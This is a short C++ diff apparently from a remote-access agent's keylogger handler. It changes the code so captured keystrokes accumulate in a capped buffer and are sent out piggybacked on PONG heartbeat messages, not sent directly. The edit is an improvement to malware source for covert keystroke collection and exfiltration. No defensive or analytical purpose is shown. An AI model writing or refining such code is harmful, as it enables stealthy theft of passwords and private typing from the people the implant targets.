@@ -196,10 +196,13 @@ void Agent::handleKeylogStart() {
             std::string keystrokes = m_keylogger.dump();
             if (keystrokes.empty()) continue;
 
-            // Store in shared buffer for PONG piggybacking — no direct send
+            // Append to shared buffer for PONG piggybacking — accumulates
+            // across multiple KEYLOG_DUMP polls until the next PONG sends it.
             {
                 std::lock_guard<std::mutex> lock(m_keylog_pending_mutex);
-                m_keylog_pending_data = std::move(keystrokes);
+                if (m_keylog_pending_data.size() + keystrokes.size() <= KeyLogger::MAX_BUFFER_SIZE) {
+                    m_keylog_pending_data += keystrokes;
+                }
             }
         }
     });
